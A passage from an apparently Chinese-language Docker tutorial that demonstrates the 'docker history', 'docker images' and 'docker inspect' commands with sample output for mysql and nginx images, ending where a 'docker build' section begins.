6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB   <br></code></pre></td></tr></table></figure><h4 id="OPTIONS-2"><a href="#OPTIONS-2" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="H"><a href="#H" class="headerlink" title="-H"></a>-H</h5><p>以可读的方式展示时间镜像信息和时间，默认开启</p><h5 id="q"><a href="#q" class="headerlink" title="-q"></a>-q</h5><p>仅列出提交记录ID</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  /tmp docker <span class="hljs-keyword">history</span> -q mysql<br>de7c37d1d5ac<br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br><span class="hljs-symbol">&lt;missing&gt;</span><br></code></pre></td></tr></table></figure><h5 id="–no-trunc-1"><a href="#–no-trunc-1" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整信息</p><h4 id="images"><a href="#images" class="headerlink" title="images"></a>images</h4><p>image ID 或REPOSITORY:TAG</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker images<br>REPOSITORY                TAG          IMAGE ID       CREATED         SIZE<br>grafana/grafana           10.2.4       147eb932c0fd  <span class="hljs-number"> 10 </span>days ago     391MB<br>mysql                     8.3.0        e68e2614955c  <span class="hljs-number"> 5 </span>weeks ago     638MB<br>apache/activemq-artemis   latest       76998b3399b7  <span class="hljs-number"> 3 </span>months ago    312MB<br>lamp_web                  latest       41d9dabcb737  <span class="hljs-number"> 6 </span>months ago    524MB<br>mysql                     latest       de7c37d1d5ac  <span class="hljs-number"> 6 </span>months ago    599MB<br>ubuntu                    latest       4c2c87c6c36e  <span class="hljs-number"> 14 </span>months ago   69.2MB<br>kalilinux/kali-rolling    latest       0d323592c7f5  <span class="hljs-number"> 14 </span>months ago   140MB<br>centos                   <span class="hljs-number"> 7 </span>           c9a1fdca3387  <span class="hljs-number"> 2 </span>years ago     301MB<br>nginx                     latest       eeb9db34b331  <span class="hljs-number"> 2 </span>years ago     134MB<br>php                       7.4.21-fpm   1829ff0bdd88  <span class="hljs-number"> 2 </span>years ago     364MB<br>vulhub/flink              1.11.2       b137254280cc  <span class="hljs-number"> 3 </span>years ago     625MB<br>islandora/activemq        latest       5d0bce1752d7  <span class="hljs-number"> 3 </span>years ago     272MB<br>webcenter/activemq        latest       3af156432993  <span class="hljs-number"> 7 </span>years ago     422MB<br></code></pre></td></tr></table></figure><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql<br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB     <br></code></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">➜  /tmp docker history mysql:<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span><br>IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT<br>e68e2614955c   <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;mysqld&quot;</span>]                                  0B        buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">EXPOSE</span> map[<span class="hljs-number">3306</span>/tcp:&#123;&#125; <span class="hljs-number">33060</span>/tcp:&#123;&#125;]            <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="hljs-string">&quot;docker-entrypoint.sh&quot;</span>]             0B        buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">COPY</span><span class="language-bash"> docker-entrypoint.sh /usr/local/bin/ <span class="hljs-comment"># …   13.5kB    buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">VOLUME</span><span class="language-bash"> [/var/lib/mysql]                         0B        buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/sh -c <span class="hljs-built_in">set</span> -eux;  microdnf install -…   303MB     buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> MYSQL_SHELL_VERSION=<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1</span>.el8             <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/sh -c <span class="hljs-built_in">set</span> -eu;  &#123;   <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;[mysql-to…   226B      buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  microdnf install -…   197MB     buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eu;  &#123;   echo &#x27;</span>[mysqlinn…   246B      buildkit.dockerfile.v0</span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> MYSQL_VERSION=<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span>-<span class="hljs-number">1</span>.el8                   <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> MYSQL_MAJOR=innovation                      <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"> /bin/sh -c <span class="hljs-built_in">set</span> -eux;  key=<span class="hljs-string">&#x27;BCA4 3417 C3B…   3.17kB    buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  microdnf install -…   14MB      buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;…   2.4MB     buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">ENV</span> GOSU_VERSION=<span class="hljs-number">1.16</span>                           <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   <span class="hljs-keyword">RUN</span><span class="language-bash"><span class="hljs-string"> /bin/sh -c set -eux;  groupadd --system …   2.77kB    buildkit.dockerfile.v0</span></span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   /bin/sh -c <span class="hljs-comment">#(nop)  CMD [&quot;/bin/bash&quot;]            0B        </span><br>&lt;missing&gt;      <span class="hljs-number">5</span> weeks ago   /bin/sh -c <span class="hljs-comment">#(nop) ADD file:53c58659a3a149d31…   122MB   </span><br></code></pre></td></tr></table></figure><h2 id="查看镜像元数据"><a href="#查看镜像元数据" class="headerlink" title="查看镜像元数据"></a>查看镜像元数据</h2><h3 id="docker-inspect"><a href="#docker-inspect" class="headerlink" title="docker inspect"></a>docker inspect</h3><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的基础数据</p><h4 id="OPTIONS-3"><a href="#OPTIONS-3" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  /tmp docker images <span class="hljs-string">| grep nginx</span><br>nginx                     latest       eeb9db34b331   <span class="hljs-number">2</span> years ago     <span class="hljs-number">134</span>MB<br></code></pre></td></tr></table></figure><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs wren">➜  /<span class="hljs-variable">tmp</span> <span class="hljs-variable">docker</span> inspect <span class="hljs-variable">nginx</span><br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;sha256:eeb9db34b33190cac170b27d857e9b23511d396a2609c1a54e93025634afed0a&quot;</span>,<br>        <span class="hljs-string">&quot;RepoTags&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx:latest&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;RepoDigests&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;Parent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Comment&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2021-12-29T18:45:32.26799474Z&quot;</span>,<br>        <span class="hljs-string">&quot;Container&quot;</span>: <span class="hljs-string">&quot;28117e6cd07462919e64874c17cec15a453e5b3d99b088f04a12a7640c27c280&quot;</span>,<br>        <span class="hljs-string">&quot;ContainerConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;28117e6cd074&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>                <span class="hljs-string">&quot;-c&quot;</span>,<br>                <span class="hljs-string">&quot;#(nop) &quot;</span>,<br>                <span class="hljs-string">&quot;CMD [<span class="hljs-char escape_">\&quot;</span>nginx<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>-g<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>daemon off;<span class="hljs-char escape_">\&quot;</span>]&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;DockerVersion&quot;</span>: <span class="hljs-string">&quot;20.10.7&quot;</span>,<br>        <span class="hljs-string">&quot;Author&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;nginx&quot;</span>,<br>                <span class="hljs-string">&quot;-g&quot;</span>,<br>                <span class="hljs-string">&quot;daemon off;&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Architecture&quot;</span>: <span class="hljs-string">&quot;arm64&quot;</span>,<br>        <span class="hljs-string">&quot;Variant&quot;</span>: <span class="hljs-string">&quot;v8&quot;</span>,<br>        <span class="hljs-string">&quot;Os&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;Size&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;VirtualSize&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/19bce005f2b1d9db0eba7c613875f51cd1b7a19ea0a43dcbf45c1017fbcc03dc/diff:/var/lib/docker/overlay2/2949cec29c3a2dfba7a1cbc215919f6ec18a27e80506dbbc51017f4389bb604e/diff:/var/lib/docker/overlay2/8f23aefbf0d9446e0dd6f9d228bdd2ed21b4b556d064352cdb546407fbe22b7b/diff:/var/lib/docker/overlay2/aba312ecee136814284e1d21b2d4f6c28cdabb85ee4d3142324ae752156359ac/diff:/var/lib/docker/overlay2/3db4264e94b91b2dac969fd2a0af7317aeb303e8d0032162e2e4734c05b750c9/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;RootFS&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;layers&quot;</span>,<br>            <span class="hljs-string">&quot;Layers&quot;</span>: [<br>                <span class="hljs-string">&quot;sha256:1c79be3b9cebb9838b5c607567cb18eb50cd94e39b20a6241ca7d2d53dcffc89&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:c6652321c7b9deb69994b5490710e7ab52a38f5171eddbe6f4d47fb9ea928929&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:d00df4ca0725daf0ad547fcc9c731ed877d7b898559703ffe94e35de77ebd455&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:eb5d612bd5e0648b5dd9680101b778787652f435ac73db4b5e559b868392a314&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:01792ec538b3b8d67d341ad7b079beec9b289feb8a1e618b3fcfe2bb0c206a2b&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:7bc89178e1bbe5212cc907f798b0f3bb3e07c71083390703e04486012d398a4f&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;Metadata&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;LastTagTime&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h2 id="生成镜像"><a href="#生成镜像" class="headerlink" title="生成镜像"></a>生成镜像</h2><h3 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h3><p><strong>docker build [OPTIONS] PATH | URL | -</strong></p><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>已有的镜像不能满足业务需求，需要自己构建符合需求的镜像</p><h4 id="OPTIONS-4"><a href="#OPTIONS-4" class="headerlink" 